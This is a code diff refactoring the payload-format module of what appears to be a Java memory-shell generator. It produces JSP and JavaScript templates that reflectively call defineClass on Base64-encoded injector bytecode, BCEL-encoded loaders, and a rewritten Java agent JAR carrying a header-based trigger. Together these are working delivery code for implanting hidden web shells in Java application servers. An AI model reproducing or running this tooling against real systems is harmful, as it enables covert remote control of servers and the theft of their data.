@@ -31,18 +31,19 @@ import java.util.jar.Manifest;
  */
 public class FormatUtil {
 
-    public static byte[] Base64Format(byte[] bytes) throws IOException {
+    public static byte[] Base64Format(byte[] bytes) {
         Base64.Encoder base64Encoder = Base64.getEncoder();
-        return new String(base64Encoder.encode(bytes)).replace("\n", "").replace("\r", "").getBytes();
+        return base64Encoder.encodeToString(bytes).replace("\n", "").replace("\r", "")
+                .getBytes(StandardCharsets.UTF_8);
     }
 
-    public static byte[] BcelFormat(MemoryObj memoryObj) throws IOException {
+    public static byte[] BcelFormat(MemoryObj memoryObj) throws Exception {
         byte[] bcelClzBytes = BCELoaderGenerator.generateBCELoaderClass(memoryObj);
-        return HackBCELs.encode(bcelClzBytes).getBytes();
+        return HackBCELs.encode(bcelClzBytes).getBytes(StandardCharsets.UTF_8);
     }
 
-    public static byte[] BigIntegerFormat(byte[] bytes) throws IOException {
-        return new BigInteger(bytes).toString(36).getBytes();
+    public static byte[] BigIntegerFormat(byte[] bytes) {
+        return new BigInteger(bytes).toString(36).getBytes(StandardCharsets.UTF_8);
     }
 
     public static byte[] JARAgentFormat(byte[] bytes, MemoryObj memoryObj) throws Exception{
@@ -56,15 +57,15 @@ public class FormatUtil {
     public static byte[] JsFormat(byte[] bytes,  MemoryObj memoryObj){
         String javaScript = "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                 "try{\n" +
-                "    classLoader.loadClass(\""+ memoryObj.getInjectorClassName() +"\").newInstance();\n" +
+                "    classLoader.loadClass(" + JavassistUtil.toJavaStringLiteral(memoryObj.getInjectorClassName()) + ").newInstance();\n" +
                 "}catch (e){\n" +
                 "    var clsString = classLoader.loadClass('java.lang.String');\n" +
-                "    var bytecodeBase64 = \""+ new BASE64Encoder().encode(bytes).replace("\n", "").replace("\r", "") + "\";\n" +
+                "    var bytecodeBase64 = " + JavassistUtil.toJavaStringLiteral(new BASE64Encoder().encode(bytes).replace("\n", "").replace("\r", "")) + ";\n" +
                 "    var bytecode;\n" +
                 "    try{\n" +
                 "        var clsBase64 = classLoader.loadClass(\"java.util.Base64\");\n" +
                 "        var clsDecoder = classLoader.loadClass(\"java.util.Base64$Decoder\");\n" +
-                "        var decoder = clsBase64.getMethod(\"getDecoder\").invoke(base64Clz);\n" +
+                "        var decoder = clsBase64.getMethod(\"getDecoder\").invoke(clsBase64);\n" +
                 "        bytecode = clsDecoder.getMethod(\"decode\", clsString).invoke(decoder, bytecodeBase64);\n" +
                 "    } catch (ee) {\n" +
                 "        var datatypeConverterClz = classLoader.loadClass(\"javax.xml.bind.DatatypeConverter\");\n" +
@@ -78,18 +79,18 @@ public class FormatUtil {
                 "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length);\n" +
                 "    clazz.newInstance();\n" +
                 "}";
-        return javaScript.getBytes();
+        return javaScript.getBytes(StandardCharsets.UTF_8);
     }
 
     public static byte[] JspFormat(byte[] bytes, MemoryObj memoryObj) throws Exception{
         String jsp = "<%\n" +
                 "    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                 "    try{\n" +
-                "        classLoader.loadClass(\""+ memoryObj.getInjectorClassName()+"\").newInstance();\n" +
+                "        classLoader.loadClass(" + JavassistUtil.toJavaStringLiteral(memoryObj.getInjectorClassName()) + ").newInstance();\n" +
                 "    }catch (Exception e){\n" +
                 "        java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                 "        defineClass.setAccessible(true);\n" +
-                "        String bytecodeBase64 = \""+new BASE64Encoder().encode(bytes).replace("\n", "").replace("\r", "") +"\";\n" +
+                "        String bytecodeBase64 = " + JavassistUtil.toJavaStringLiteral(new BASE64Encoder().encode(bytes).replace("\n", "").replace("\r", "")) + ";\n" +
                 "        byte[] bytecode = null;\n" +
                 "        try {\n" +
                 "            Class base64Clz = classLoader.loadClass(\"java.util.Base64\");\n" +
@@ -104,7 +105,7 @@ public class FormatUtil {
                 "        clazz.newInstance();\n" +
                 "    }\n" +
                 "%>";
-        return jsp.getBytes();
+        return jsp.getBytes(StandardCharsets.UTF_8);
     }
 }
 
@@ -129,9 +130,13 @@ class JARAgentGenerator {
         String classFileName = simpleName.replace('.', '/') + ".class";
         ClassPool pool = ClassPool.getDefault();
 
-        InputStream jarStream = JARAgentGenerator.class.getClassLoader().getResourceAsStream("conf/agent.jar");
         File jarFile = File.createTempFile("agent", ".jar");
-        try (FileOutputStream out = new FileOutputStream(jarFile)) {
+        jarFile.deleteOnExit();
+        try (InputStream jarStream = JARAgentGenerator.class.getClassLoader().getResourceAsStream("conf/agent.jar");
+             FileOutputStream out = new FileOutputStream(jarFile)) {
+            if (jarStream == null) {
+                throw new FileNotFoundException("Missing resource: conf/agent.jar");
+            }
             byte[] buffer = new byte[16 * 1024];
             int bytesRead;
             while ((bytesRead = jarStream.read(buffer)) != -1) {
@@ -141,12 +146,14 @@ class JARAgentGenerator {
 
         Manifest manifest = createManifest(simpleName);
         File tempJarFile = File.createTempFile("tempJar", ".jar");
+        tempJarFile.deleteOnExit();
 
         try (JarFile jar = new JarFile(jarFile);
              JarOutputStream tempJar = new JarOutputStream(new FileOutputStream(tempJarFile), manifest)) {
 
-            copyJarEntries(jar, tempJar);
-            addModifiedClassToJar(pool, className, simpleName, classFileName, tempJar, memoryObj.getPass(), StrUtils.base64Encode(bytes));
+            copyJarEntries(jar, tempJar, classFileName);
+            addModifiedClassToJar(pool, className, simpleName, classFileName, tempJar,
+                    memoryObj.getHeaderName(), memoryObj.getHeaderValue(), StrUtils.base64Encode(bytes));
         }
 
         return Files.readAllBytes(Paths.get(tempJarFile.getAbsolutePath()));
@@ -163,10 +170,13 @@ class JARAgentGenerator {
         return manifest;
     }
 
-    private static void copyJarEntries(JarFile jar, JarOutputStream tempJar) throws IOException {
+    private static void copyJarEntries(JarFile jar, JarOutputStream tempJar, String replacementEntryName) throws IOException {
         Enumeration<JarEntry> jarEntries = jar.entries();
         while (jarEntries.hasMoreElements()) {
             JarEntry entry = jarEntries.nextElement();
+            if (JarFile.MANIFEST_NAME.equalsIgnoreCase(entry.getName()) || replacementEntryName.equals(entry.getName())) {
+                continue;
+            }
             try (InputStream entryInputStream = jar.getInputStream(entry)) {
                 tempJar.putNextEntry(entry);
                 byte[] buffer = new byte[16 * 1024];
@@ -174,24 +184,31 @@ class JARAgentGenerator {
                 while ((bytesRead = entryInputStream.read(buffer)) != -1) {
                     tempJar.write(buffer, 0, bytesRead);
                 }
+                tempJar.closeEntry();
             }
         }
     }
 
-    private static void addModifiedClassToJar(ClassPool pool, String className, String simpleName, String classFileName, JarOutputStream tempJar, String injectFlag, String injectorCode) throws Exception {
+    private static void addModifiedClassToJar(ClassPool pool, String className, String simpleName, String classFileName, JarOutputStream tempJar, String injectHeaderName, String injectHeaderValue, String injectorCode) throws Exception {
         CtClass ctClass = pool.get(className);
-        ctClass.getClassFile().setVersionToJava5();
-        ctClass.setName(simpleName);
-        JavassistUtil.addOrUpdateMethod(ctClass, "getInjectorCode", "return \"" + injectorCode + "\";");
-        tempJar.putNextEntry(new JarEntry(classFileName));
-        tempJar.write(ctClass.toBytecode());
-        ctClass.detach();
+        try {
+            ctClass.getClassFile().setVersionToJava5();
+            ctClass.setName(ClassNameUtil.requireValidJavaClassName(simpleName, "agent transformer class name"));
+            JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "injectHeaderName", RandomHeaderUtil.requireValidHeaderName(injectHeaderName));
+            JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "injectHeaderValue", RandomHeaderUtil.requireValidHeaderValue(injectHeaderValue));
+            JavassistUtil.addOrUpdateMethod(ctClass, "getInjectorCode", JavassistUtil.returnStringBody(injectorCode));
+            tempJar.putNextEntry(new JarEntry(classFileName));
+            tempJar.write(ctClass.toBytecode());
+            tempJar.closeEntry();
+        } finally {
+            ctClass.detach();
+        }
     }
 }
 
 class JARGenerator {
     public static byte[] generate(byte[] bytes, MemoryObj memoryObj) throws Exception {
-        String className = memoryObj.getInjectorClassName();
+        String className = ClassNameUtil.requireValidJavaClassName(memoryObj.getInjectorClassName(), "injector class name");
         String jarEntryFileName = className.replace(".", "/") + ".class";
 
         Manifest manifest = new Manifest();
@@ -284,34 +301,31 @@ class BCELoader {
 }
 
 class BCELoaderGenerator {
-    public static byte[] generateBCELoaderClass(MemoryObj memoryObj) {
+    public static byte[] generateBCELoaderClass(MemoryObj memoryObj) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        ClassClassPath classPath = new ClassClassPath(BCELoader.class);
+        pool.insertClassPath(classPath);
+        CtClass ctClass = pool.getCtClass(BCELoader.class.getName());
         try {
-            ClassPool pool = ClassPool.getDefault();
-            ClassClassPath classPath = new ClassClassPath(BCELoader.class);
-            pool.insertClassPath(classPath);
-            CtClass ctClass = pool.getCtClass(BCELoader.class.getName());
-            ctClass.setName(memoryObj.getLoaderClassName());
+            ctClass.setName(ClassNameUtil.requireValidJavaClassName(memoryObj.getLoaderClassName(), "loader class name"));
             ctClass.getClassFile().setVersionToJava5();
             CtMethod getClassNameMethod = ctClass.getDeclaredMethod("getClassName");
-            getClassNameMethod.setBody(String.format("{return \"%s\";}", memoryObj.getInjectorClassName()));
+            getClassNameMethod.setBody(JavassistUtil.returnStringBody(memoryObj.getInjectorClassName()));
             CtMethod getBase64StringMethod = ctClass.getDeclaredMethod("getBase64String");
             String base64ClassString = encodeToBase64(memoryObj.getInjectorBytes()).replace(System.lineSeparator(), "");
             String[] parts = splitChunks(base64ClassString, 40000);
             StringBuilder result = new StringBuilder();
             for (int i = 0; i < parts.length; i++) {
                 if (i > 0) result.append("+");
-                result.append("new String(\"" + parts[i] + "\")");
+                result.append("new String(").append(JavassistUtil.toJavaStringLiteral(parts[i])).append(")");
             }
             getBase64StringMethod.setBody(String.format("{return %s;}", result));
             ctClass.defrost();
             JavassistUtil.removeSourceFileAttribute(ctClass);
-            byte[] bytes = ctClass.toBytecode();
+            return ctClass.toBytecode();
+        } finally {
             ctClass.detach();
-            return bytes;
-        } catch (Exception e) {
-            e.printStackTrace();
         }
-        return null;
     }
 
     private static String encodeToBase64(byte[] input) throws Exception {
@@ -328,6 +342,9 @@ class BCELoaderGenerator {
                 value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, input);
             } catch (Exception var5) {
             }
+        }
+        if (value == null) {
+            throw new IllegalStateException("Unable to Base64 encode injector bytes");
         }
         return value;
     }
